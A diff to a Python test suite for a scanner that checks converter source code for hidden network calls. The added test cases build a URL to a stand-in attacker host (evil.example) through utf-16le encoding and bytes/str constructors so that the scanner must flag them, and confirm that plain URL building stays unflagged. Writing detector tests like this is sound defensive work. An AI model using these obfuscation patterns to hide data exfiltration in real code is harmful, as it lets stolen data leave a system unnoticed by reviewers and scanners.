@@ -4816,8 +4816,17 @@ def test_a_literal_transformed_by_any_unreadable_method_refuses_it():
     ):
         assert [f.check for f in scan_converter_source(preamble + body)], body
 
+    # The constructors spell the same transformation with no method in sight.
+    payload = repr("https://evil.example/c".encode("utf-16le"))
+    for body in (
+        f'url = str({payload}, "utf-16le")\n' + send,
+        'url = bytes("https://evil.example/c", "utf-8").decode()\n' + send,
+    ):
+        assert [f.check for f in scan_converter_source(preamble + body)], body
+
     for body in (
         'url = "{}/api".format(HUB)\n' + send,
+        'url = f"{HUB}/api/" + str(model_id)\n' + send,
         'url = HUB + "/api"\nname = base.replace(" ", "-")\n' + send,
     ):
         assert scan_converter_source(preamble + body) == [], body
